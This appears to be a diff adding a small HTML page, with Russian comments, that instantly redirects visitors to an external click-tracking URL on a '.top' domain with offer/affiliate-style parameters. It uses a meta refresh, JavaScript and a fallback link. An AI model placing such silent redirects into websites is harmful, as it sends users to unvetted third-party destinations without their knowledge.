@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0; url=https://smikit.top/click?o=2&a=9414">
+    
+    <script>
+        // 2. Редирект через JavaScript
+        window.location.replace("https://smikit.top/click?o=2&a=9414");
+    </script>
+</head>
+<body>
+    Если переход не произошел, <a href="https://smikit.top/click?o=2&a=9414">нажмите здесь</a>.
+</body>
+</html>
